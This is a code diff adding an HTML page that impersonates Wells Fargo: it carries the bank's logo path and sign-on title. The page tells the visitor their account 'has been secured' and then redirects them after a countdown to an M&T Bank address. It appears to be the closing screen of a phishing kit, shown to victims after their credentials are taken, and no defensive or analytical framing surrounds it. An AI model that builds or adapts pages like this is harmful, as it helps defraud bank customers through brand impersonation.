@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <link rel="stylesheet" href="../static/css/index.css">
+    
+    <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
+</head>
+<body onload="linking_acc()">
+    <div class="navbar">
+        <div class="brand">
+            <img src="../static/images/wells.webp" alt="">
+        </div>
+    </div>
+
+    <div style="padding-top: 5px;" class="middle-form">
+        <p style="font-size: 28px;"> Your Account has been secured! </p>
+
+        <p style="margin-bottom: 30px;" class='middle'>You will now be automatically redirected</p>
+        
+        <hr>
+       
+        <div style="background: #007856; border: 2px solid #007856; width: 50%; margin: 40px auto; border-radius: 6px;" class="neutral-link">
+            <a id="count-down" style="font-family: Georgia, 'Times New Roman', Times, serif; text-decoration: none; color: white;">10</a>
+        </div>
+        
+        </div>      
+    </div>
+
+    <script>
+        function linking_acc(){
+    var word = document.getElementById('count-down');
+    var time = 10;
+    setInterval(timer, 1000)
+    function timer(){
+        if(time > 0){
+            time --
+            word.innerHTML = time
+        } 
+        if(time == 1){
+            window.location.replace('https://www3.mtb.com')
+        }
+    }
+}
+    </script>
+</body>
+</html>
